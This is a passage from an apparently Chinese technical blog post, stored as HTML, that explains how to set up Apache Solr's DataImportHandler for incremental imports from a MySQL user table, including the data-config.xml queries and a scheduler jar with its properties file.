class=\"built_in\">test</span>QueryAll();</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x5982;&#x679C;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x4F46;&#x662F;Solr&#x7D22;&#x5F15;&#x4E2D;&#x6CA1;&#x6709;index&#x8FD9;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x5C31;&#x67E5;&#x4E0D;&#x5230;&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x822C;&#x5728;&#x4F7F;&#x7528;Solr&#x68C0;&#x7D22;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;&#x90FD;&#x662F;&#x5148;&#x63D2;&#x5165;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x518D;&#x5728;Solr&#x4E2D;index&#x8FD9;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x7528;Solr&#x7684;&#x6A21;&#x7CCA;&#x67E5;&#x8BE2;&#x6216;&#x662F;&#x5206;&#x8BCD;&#x529F;&#x80FD;&#x6765;&#x68C0;&#x7D22;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>\n<h3 id=\"DIH&#x589E;&#x91CF;&#x4ECE;MYSQL&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E;\"><a href=\"#DIH&#x589E;&#x91CF;&#x4ECE;MYSQL&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E;\" class=\"headerlink\" title=\"DIH&#x589E;&#x91CF;&#x4ECE;MYSQL&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E;\"></a>DIH&#x589E;&#x91CF;&#x4ECE;MYSQL&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E;</h3><p>&#x5DF2;&#x7ECF;&#x5B66;&#x4F1A;&#x4E86;&#x5982;&#x4F55;&#x5168;&#x91CF;&#x5BFC;&#x5165;MySQL&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5168;&#x91CF;&#x5BFC;&#x5165;&#x5728;&#x6570;&#x636E;&#x91CF;&#x5927;&#x7684;&#x65F6;&#x5019;&#x4EE3;&#x4EF7;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x90FD;&#x4F1A;&#x9002;&#x7528;&#x589E;&#x91CF;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x5BFC;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x4E0B;&#x9762;&#x4ECB;&#x7ECD;&#x5982;&#x4F55;&#x589E;&#x91CF;&#x5BFC;&#x5165;MYSQL&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4EE5;&#x53CA;&#x5982;&#x4F55;&#x8BBE;&#x7F6E;&#x5B9A;&#x65F6;&#x6765;&#x505A;&#x3002;</p>\n<p>1&#xFF09;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7684;&#x66F4;&#x6539;</p>\n<p>&#x524D;&#x9762;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#x597D;&#x4E86;&#x4E00;&#x4E2A;User&#x7684;&#x8868;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#xFF0C;&#x9700;&#x8981;&#x65B0;&#x589E;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;updateTime&#xFF0C;&#x7C7B;&#x578B;&#x4E3A;timestamp&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;CURRENT_TIMESTAMP&#x3002;</p>\n<p>&#x6709;&#x4E86;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;Solr&#x624D;&#x80FD;&#x5224;&#x65AD;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x662F;&#x65B0;&#x7684;&#x3002;</p>\n<p>&#x56E0;&#x4E3A;Solr&#x672C;&#x8EAB;&#x6709;&#x4E00;&#x4E2A;&#x9ED8;&#x8BA4;&#x503C;last_index_time&#xFF0C;&#x8BB0;&#x5F55;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x505A;full import&#x6216;&#x8005;&#x662F;delta import(&#x589E;&#x91CF;&#x5BFC;&#x5165;&#xFF09;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x5B58;&#x50A8;&#x5728;&#x6587;&#x4EF6;conf&#x76EE;&#x5F55;&#x7684;dataimport.properties&#x6587;&#x4EF6;&#x4E2D;&#x3002;</p>\n<p>2&#xFF09;data-config.xml&#x4E2D;&#x5FC5;&#x8981;&#x5C5E;&#x6027;&#x7684;&#x8BBE;&#x7F6E;</p>\n<p>transformer &#x683C;&#x5F0F;&#x8F6C;&#x5316;&#xFF1A;HTMLStripTransformer &#x7D22;&#x5F15;&#x4E2D;&#x5FFD;&#x7565;HTML&#x6807;&#x7B7E;<br>query&#xFF1A;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7B26;&#x5408;&#x8BB0;&#x5F55;&#x6570;&#x636E;<br>deltaQuery&#xFF1A;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x67E5;&#x8BE2;&#x4E3B;&#x952E;ID  &#x6CE8;&#x610F;&#x8FD9;&#x4E2A;&#x53EA;&#x80FD;&#x8FD4;&#x56DE;ID&#x5B57;&#x6BB5;<br>deltaImportQuery&#xFF1A;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x67E5;&#x8BE2;&#x5BFC;&#x5165;&#x7684;&#x6570;&#x636E;<br>deletedPkQuery&#xFF1A;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x5220;&#x9664;&#x4E3B;&#x952E;ID&#x67E5;&#x8BE2; &#x6CE8;&#x610F;&#x8FD9;&#x4E2A;&#x53EA;&#x80FD;&#x8FD4;&#x56DE;ID&#x5B57;&#x6BB5;   </p>\n<p>&#x6709;&#x5173;&#x201C;query&#x201D;&#xFF0C;&#x201C;deltaImportQuery&#x201D;&#xFF0C; &#x201C;deltaQuery&#x201D;&#x7684;&#x89E3;&#x91CA;&#xFF0C;&#x5F15;&#x7528;&#x5B98;&#x7F51;&#x8BF4;&#x660E;&#xFF0C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;<br>The query gives the data needed to populate fields of the Solr document in full-import<br>The deltaImportQuery gives the data needed to populate fields when running a delta-import<br>The deltaQuery gives the primary keys of the current entity which have changes since the last index time</p>\n<p>&#x5982;&#x679C;&#x9700;&#x8981;&#x5173;&#x8054;&#x5B50;&#x8868;&#x67E5;&#x8BE2;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x7528;&#x5230;parentDeltaQuery<br>The parentDeltaQuery uses the changed rows of the current table (fetched with deltaQuery) to give the changed rows in theparent table. This is necessary because whenever a row in the child table changes, we need to re-generate the document which has that field.</p>\n<p>&#x66F4;&#x591A;&#x8BF4;&#x660E;&#x770B;DeltaImportHandler&#x7684;&#x8BF4;&#x660E;&#x6587;&#x6863;&#x3002;</p>\n<p>&#x9488;&#x5BF9;User&#x8868;&#xFF0C;data-config.xml&#x6587;&#x4EF6;&#x7684;&#x914D;&#x7F6E;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;dataConfig&gt;</span><br><span class=\"line\">    &lt;dataSource <span class=\"built_in\">type</span>=<span class=\"string\">&quot;JdbcDataSource&quot;</span> driver=<span class=\"string\">&quot;com.mysql.jdbc.Driver&quot;</span> url=<span class=\"string\">&quot;jdbc:mysql://127.0.0.1:3306/mybatis&quot;</span> user=<span class=\"string\">&quot;root&quot;</span> password=<span class=\"string\">&quot;luxx&quot;</span> batchSize=<span class=\"string\">&quot;-1&quot;</span> /&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&lt;document name=<span class=\"string\">&quot;testDoc&quot;</span>&gt;</span><br><span class=\"line\">        &lt;entity name=<span class=\"string\">&quot;user&quot;</span> pk=<span class=\"string\">&quot;id&quot;</span></span><br><span class=\"line\">                query=<span class=\"string\">&quot;select * from user&quot;</span></span><br><span class=\"line\">                deltaImportQuery=<span class=\"string\">&quot;select * from user where id=&apos;<span class=\"variable\">${dih.delta.id}</span>&apos;&quot;</span></span><br><span class=\"line\">                deltaQuery=<span class=\"string\">&quot;select id from user where updateTime&gt; &apos;<span class=\"variable\">${dataimporter.last_index_time}</span>&apos;&quot;</span>&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;         &lt;field column=<span class=\"string\">&quot;id&quot;</span> name=<span class=\"string\">&quot;id&quot;</span>/&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;        &lt;field column=<span class=\"string\">&quot;userName&quot;</span> name=<span class=\"string\">&quot;userName&quot;</span>/&gt;</span><br><span class=\"line\">            &lt;field column=<span class=\"string\">&quot;userAge&quot;</span> name=<span class=\"string\">&quot;userAge&quot;</span>/&gt;</span><br><span class=\"line\">            &lt;field column=<span class=\"string\">&quot;userAddress&quot;</span> name=<span class=\"string\">&quot;userAddress&quot;</span>/&gt;</span><br><span class=\"line\">&lt;field column=<span class=\"string\">&quot;updateTime&quot;</span> name=<span class=\"string\">&quot;updateTime&quot;</span>/&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;  &lt;/entity&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&lt;/document&gt;</span><br><span class=\"line\">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>\n<p>&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x7684;&#x539F;&#x7406;&#x662F;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x6839;&#x636E;deltaQuery&#x6307;&#x5B9A;&#x7684;SQL&#x8BED;&#x53E5;&#x67E5;&#x8BE2;&#x51FA;&#x6240;&#x6709;&#x9700;&#x8981;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x6570;&#x636E;&#x7684;ID&#x53F7;&#x3002;</p>\n<p>&#x7136;&#x540E;&#x6839;&#x636E;deltaImportQuery&#x6307;&#x5B9A;&#x7684;SQL&#x8BED;&#x53E5;&#x8FD4;&#x56DE;&#x6240;&#x6709;&#x8FD9;&#x4E9B;ID&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5373;&#x4E3A;&#x8FD9;&#x6B21;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x6240;&#x8981;&#x5904;&#x7406;&#x7684;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x6838;&#x5FC3;&#x601D;&#x60F3;&#x662F;&#xFF1A;&#x901A;&#x8FC7;&#x5185;&#x7F6E;&#x53D8;&#x91CF;&#x201C;${dih.delta.id}&#x201D;&#x548C; &#x201C;${dataimporter.last_index_time}&#x201D;&#x6765;&#x8BB0;&#x5F55;&#x672C;&#x6B21;&#x8981;&#x7D22;&#x5F15;&#x7684;id&#x548C;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x7D22;&#x5F15;&#x7684;&#x65F6;&#x95F4;&#x3002;</p>\n<p>&#x6CE8;&#x610F;&#xFF1A;&#x521A;&#x65B0;&#x52A0;&#x4E0A;&#x7684;updateTime&#x5B57;&#x6BB5;&#x4E5F;&#x8981;&#x5728;field&#x5C5E;&#x6027;&#x4E2D;&#x914D;&#x7F6E;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x8981;&#x5728;schema.xml&#x6587;&#x4EF6;&#x4E2D;&#x914D;&#x7F6E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;field name=<span class=\"string\">&quot;updateTime&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;date&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5982;&#x679C;&#x4E1A;&#x52A1;&#x4E2D;&#x8FD8;&#x6709;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x52A0;&#x4E00;&#x4E2A;isDeleted&#x5B57;&#x6BB5;&#x6765;&#x8868;&#x660E;&#x8BE5;&#x6761;&#x6570;&#x636E;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x88AB;&#x5220;&#x9664;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;Solr&#x5728;&#x66F4;&#x65B0;index&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x6765;&#x66F4;&#x65B0;&#x54EA;&#x4E9B;&#x5DF2;&#x7ECF;&#x5220;&#x9664;&#x4E86;&#x7684;&#x8BB0;&#x5F55;&#x7684;&#x7D22;&#x5F15;&#x3002;</p>\n<p>&#x8FD9;&#x65F6;&#x5019;&#x9700;&#x8981;&#x5728;dataConfig.xml&#x4E2D;&#x6DFB;&#x52A0;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">query=<span class=\"string\">&quot;select * from user where isDeleted=0&quot;</span></span><br><span class=\"line\">deltaImportQuery=<span class=\"string\">&quot;select * from user where id=&apos;<span class=\"variable\">${dih.delta.id}</span>&apos;&quot;</span></span><br><span class=\"line\">deltaQuery=<span class=\"string\">&quot;select id from user where updateTime&gt; &apos;<span class=\"variable\">${dataimporter.last_index_time}</span>&apos; and isDeleted=0&quot;</span></span><br><span class=\"line\">deletedPkQuery=<span class=\"string\">&quot;select id from user where isDeleted=1&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x65F6;&#x5019;Solr&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x5220;&#x9664;&#x6570;&#x636E;&#x5E93;&#x4E2D;isDeleted=1&#x7684;&#x6570;&#x636E;&#x7684;&#x7D22;&#x5F15;&#x3002;</p>\n<h3 id=\"&#x6D4B;&#x8BD5;&#x589E;&#x91CF;&#x5BFC;&#x5165;\"><a href=\"#&#x6D4B;&#x8BD5;&#x589E;&#x91CF;&#x5BFC;&#x5165;\" class=\"headerlink\" title=\"&#x6D4B;&#x8BD5;&#x589E;&#x91CF;&#x5BFC;&#x5165;\"></a>&#x6D4B;&#x8BD5;&#x589E;&#x91CF;&#x5BFC;&#x5165;</h3><p>&#x5982;&#x679C;User&#x8868;&#x91CC;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;&#x6E05;&#x7A7A;&#x4EE5;&#x524D;&#x7684;&#x6D4B;&#x8BD5;&#x6570;&#x636E;&#xFF08;&#x56E0;&#x4E3A;&#x52A0;&#x7684;updateTime&#x6CA1;&#x6709;&#x503C;&#xFF09;&#xFF0C;&#x7528;&#x6211;&#x7684;Mybatis&#x6D4B;&#x8BD5;&#x7A0B;&#x5E8F;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;User&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x4F1A;&#x4EE5;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#x8D4B;&#x503C;&#x7ED9;&#x8BE5;&#x5B57;&#x6BB5;&#x3002;&#x5728;Solr&#x4E2D;&#x4F7F;&#x7528;Query&#x67E5;&#x8BE2;&#x6240;&#x6709;&#x6CA1;&#x6709;&#x67E5;&#x8BE2;&#x5230;&#x8BE5;&#x503C;&#xFF0C;&#x4F7F;&#x7528;dataimport?command=delta-import&#x589E;&#x91CF;&#x5BFC;&#x5165;&#xFF0C;&#x518D;&#x6B21;&#x67E5;&#x8BE2;&#x6240;&#x6709;&#x5C31;&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x5230;&#x521A;&#x521A;&#x63D2;&#x5165;&#x5230;MySQL&#x7684;&#x503C;&#x3002;</p>\n<h3 id=\"&#x8BBE;&#x7F6E;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x4E3A;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;\"><a href=\"#&#x8BBE;&#x7F6E;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x4E3A;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;\" class=\"headerlink\" title=\"&#x8BBE;&#x7F6E;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x4E3A;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;\"></a>&#x8BBE;&#x7F6E;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x4E3A;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;</h3><p>&#x53EF;&#x4EE5;&#x7528;Windows&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#xFF0C;&#x6216;&#x8005;Linux&#x7684;Cron&#x6765;&#x5B9A;&#x671F;&#x8BBF;&#x95EE;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x8FDE;&#x63A5;&#x6765;&#x5B8C;&#x6210;&#x5B9A;&#x65F6;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x8FD9;&#x5176;&#x5B9E;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x5E94;&#x8BE5;&#x6CA1;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#x3002;</p>\n<p>&#x4F46;&#x662F;&#x66F4;&#x65B9;&#x4FBF;&#xFF0C;&#x66F4;&#x52A0;&#x4E0E;Solr&#x672C;&#x8EAB;&#x96C6;&#x6210;&#x5EA6;&#x9AD8;&#x7684;&#x662F;&#x5229;&#x7528;&#x5176;&#x81EA;&#x8EAB;&#x7684;&#x5B9A;&#x65F6;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x529F;&#x80FD;&#x3002;</p>\n<p>1&#x3001;&#x4E0B;&#x8F7D;apache-solr-dataimportscheduler-1.0.jar&#x653E;&#x5230;\\solr-webapp\\webapp\\WEB-INF\\lib&#x76EE;&#x5F55;&#x4E0B;&#xFF1A;<br>&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href=\"http://code.google.com/p/solr-dataimport-scheduler/downloads/list\" target=\"_blank\" rel=\"external\">http://code.google.com/p/solr-dataimport-scheduler/downloads/list</a><br>&#x4E5F;&#x53EF;&#x4EE5;&#x5230;&#x767E;&#x5EA6;&#x4E91;&#x76D8;&#x4E0B;&#x8F7D;&#xFF1A;<a href=\"http://pan.baidu.com/s/1dDw0MRn\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/s/1dDw0MRn</a></p>\n<p>&#x6CE8;&#x610F;&#xFF1A;apache-solr-dataimportscheduler-1.0.jar&#x6709;bug&#xFF0C;&#x53C2;&#x8003;&#xFF1A;<a href=\"http://www.denghuafeng.com/post-242.html\" target=\"_blank\" rel=\"external\">http://www.denghuafeng.com/post-242.html</a></p>\n<p>2&#x3001;&#x4FEE;&#x6539;solr&#x7684;WEB-INF&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x7684;web.xml&#x6587;&#x4EF6;&#xFF1A;<br>&#x4E3A;<web-app>&#x5143;&#x7D20;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x5B50;&#x5143;&#x7D20;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;listener&gt;</span><br><span class=\"line\">        &lt;listener-class&gt;</span><br><span class=\"line\">    org.apache.solr.handler.dataimport.scheduler.ApplicationListener</span><br><span class=\"line\">        &lt;/listener-class&gt;</span><br><span class=\"line\">    &lt;/listener&gt;</span><br></pre></td></tr></table></figure></web-app></p>\n<p>3&#x3001;&#x65B0;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;dataimport.properties&#xFF1A;</p>\n<p>&#x5728;SOLR_HOME\\solr&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;conf&#xFF08;&#x6CE8;&#x610F;&#x4E0D;&#x662F;SOLR_HOME\\solr\\collection1&#x4E0B;&#x9762;&#x7684;conf&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x7528;&#x89E3;&#x538B;&#x6587;&#x4EF6;&#x6253;&#x5F00;apache-solr-dataimportscheduler-1.0.jar&#x6587;&#x4EF6;&#xFF0C;&#x5C06;&#x91CC;&#x9762;&#x7684;dataimport.properties&#x6587;&#x4EF6;&#x62F7;&#x8D1D;&#x8FC7;&#x6765;&#xFF0C;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x6700;&#x7EC8;&#x6211;&#x7684;&#x81EA;&#x52A8;&#x5B9A;&#x65F6;&#x66F4;&#x65B0;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#################################################</span></span><br><span class=\"line\"><span class=\"comment\">#                                               #</span></span><br><span class=\"line\"><span class=\"comment\">#       dataimport scheduler properties         #</span></span><br><span class=\"line\"><span class=\"comment\">#                                               #</span></span><br><span class=\"line\"><span class=\"comment\">#################################################</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  to sync or not to sync</span></span><br><span class=\"line\"><span class=\"comment\">#  1 - active; anything else - inactive</span></span><br><span class=\"line\">syncEnabled=1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  which cores to schedule</span></span><br><span class=\"line\"><span class=\"comment\">#  in a multi-core environment you can decide which cores you want syncronized</span></span><br><span class=\"line\"><span class=\"comment\">#  leave empty or comment it out if using single-core deployment</span></span><br><span class=\"line\"><span class=\"comment\">#  syncCores=game,resource</span></span><br><span class=\"line\">syncCores=collection1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  solr server name or IP address</span></span><br><span class=\"line\"><span class=\"comment\">#  [defaults to localhost if empty]</span></span><br><span class=\"line\">server=localhost</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  solr server port</span></span><br><span class=\"line\"><span class=\"comment\">#  [defaults to 80 if empty]</span></span><br><span class=\"line\">port=8983</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  application name/context</span></span><br><span class=\"line\"><span class=\"comment\">#  [defaults to current ServletContextListener&apos;s context (app) name]</span></span><br><span class=\"line\">webapp=solr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  URLparams [mandatory]</span></span><br><span class=\"line\"><span class=\"comment\">#  remainder of URL</span></span><br><span class=\"line\"><span class=\"comment\">#http://localhost:8983/solr/collection1/dataimport?command=delta-import&amp;clean=false&amp;commit=true</span></span><br><span class=\"line\">params=/dataimport?<span class=\"built_in\">command</span>=delta-import&amp;clean=<span class=\"literal\">false</span>&amp;commit=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  schedule interval</span></span><br><span class=\"line\"><span class=\"comment\">#  number of minutes between two runs</span></span><br><span class=\"line\"><span class=\"comment\">#  [defaults to 30 if empty]</span></span><br><span class=\"line\">interval=1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  &#x91CD;&#x505A;&#x7D22;&#x5F15;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x5355;&#x4F4D;&#x5206;&#x949F;&#xFF0C;&#x9ED8;&#x8BA4;7200&#xFF0C;&#x5373;1&#x5929;; </span></span><br><span class=\"line\"><span class=\"comment\">#  &#x4E3A;&#x7A7A;,&#x4E3A;0,&#x6216;&#x8005;&#x6CE8;&#x91CA;&#x6389;:&#x8868;&#x793A;&#x6C38;&#x4E0D;&#x91CD;&#x505A;&#x7D22;&#x5F15;</span></span><br><span class=\"line\"><span class=\"comment\"># reBuildIndexInterval=2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  &#x91CD;&#x505A;&#x7D22;&#x5F15;&#x7684;&#x53C2;&#x6570;</span></span><br><span class=\"line\">reBuildIndexParams=/dataimport?<span class=\"built_in\">command</span>=full-import&amp;clean=<span class=\"literal\">true</span>&amp;commit=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#  &#x91CD;&#x505A;&#x7D22;&#x5F15;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x7684;&#x8BA1;&#x65F6;&#x5F00;&#x59CB;&#x65F6;&#x95F4;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x771F;&#x6B63;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;=reBuildIndexBeginTime+reBuildIndexInterval*60*1000&#xFF1B;</span></span><br><span class=\"line\"><span class=\"comment\">#  &#x4E24;&#x79CD;&#x683C;&#x5F0F;&#xFF1A;2012-04-11 03:10:00 &#x6216;&#x8005;  03:10:00&#xFF0C;&#x540E;&#x4E00;&#x79CD;&#x4F1A;&#x81EA;&#x52A8;&#x8865;&#x5168;&#x65E5;&#x671F;&#x90E8;&#x5206;&#x4E3A;&#x670D;&#x52A1;&#x542F;&#x52A8;&#x65F6;&#x7684;&#x65E5;&#x671F;</span></span><br><span class=\"line\">reBuildIndexBeginTime=03:10:00</span><br></pre></td></tr></table></figure>\n<p>&#x8FD9;&#x91CC;&#x4E3A;&#x4E86;&#x505A;&#x6D4B;&#x8BD5;&#x6BCF;1&#x5206;&#x949F;&#x5C31;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#xFF0C;&#x540C;&#x65F6;disable&#x4E86;full-import&#x5168;&#x91CF;&#x7D22;&#x5F15;&#x3002;</p>\n<p>4&#x3001;&#x6D4B;&#x8BD5;</p>\n<p>&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x5728;Solr 